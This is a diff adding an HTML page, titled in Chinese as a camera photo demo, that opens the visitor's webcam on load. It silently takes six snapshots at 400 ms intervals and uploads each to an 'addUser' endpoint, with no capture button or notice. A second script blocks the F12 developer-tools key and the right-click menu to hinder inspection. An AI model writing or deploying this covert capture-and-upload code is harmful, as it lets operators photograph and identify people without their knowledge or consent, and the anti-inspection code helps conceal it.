@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>html5调用摄像头拍照</title>
+    <style scoped>
+        *{
+            margin: 0;
+            padding: 0;
+        }
+        article,section,div{
+            width: 100%;
+            height: 100%;
+        }
+        video {
+            transform: scaleX(-1);
+            width: 100%;
+            height: 100%;
+        }
+        p { text-align: center; }
+    </style>
+</head>
+<body>
+<div id="camera">
+    <article>
+        <section id="splash">
+            <p id="errorMessage">Loading...</p>
+        </section>
+        <section id="app" hidden>
+            <video id="monitor" autoplay ></video>
+                <canvas id="photo" hidden></canvas>
+        </section>
+    </article>
+</div>
+<script src="https://cdn.bootcdn.net/ajax/libs/axios/0.19.2/axios.js"></script>
+<script>
+  window.onload =function(){
+    init({ video:true })
+  }
+  function init(constraints){
+    navigator.mediaDevices.getUserMedia(constraints)
+      .then(function(stream) {
+        gotStream(stream)
+      })
+      .catch(function(err) {
+        noStream()
+      });
+  }
+
+  var video = document.getElementById('monitor');
+  var canvas = document.getElementById('photo');
+
+  function gotStream(stream) {
+    video.srcObject = stream;
+    video.onerror = function () {
+      stream.stop();
+    };
+    stream.onended = noStream;
+    video.onloadedmetadata = function () {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      document.getElementById('splash').hidden = true;
+      document.getElementById('app').hidden = false;
+        for(let i=0;i<6;i++){
+            setTimeout(snapshot,400 * i);
+        }
+    };
+  }
+  function noStream() {
+    document.getElementById('errorMessage').textContent = 'No camera available.';
+  }
+    function saveImg(blob){
+        var formData = new FormData()
+        formData.append('file', blob)
+        axios.post('addUser', formData,{
+            headers:{
+                'Content-Type': 'multipart/form-data'
+            }
+        }).then(function (response) {
+            console.log(response);
+        })
+        .catch(function (error) {
+            console.log(error);
+        });
+    }
+  function snapshot() {
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      var imgData = canvas.toDataURL('image/jpeg');
+      canvas.toBlob(function (blob) {
+          saveImg(blob)
+      }, 'image/jpeg')
+
+  }
+</script>
+<script>
+    document.addEventListener('keydown', function(event){
+        return 123 != event.keyCode || (event.returnValue = false)
+    });
+    //禁止右键、选择、复制
+    document.addEventListener('contextmenu', function(event){
+        return event.returnValue = false
+    })
+</script>
+</body>
+</html>
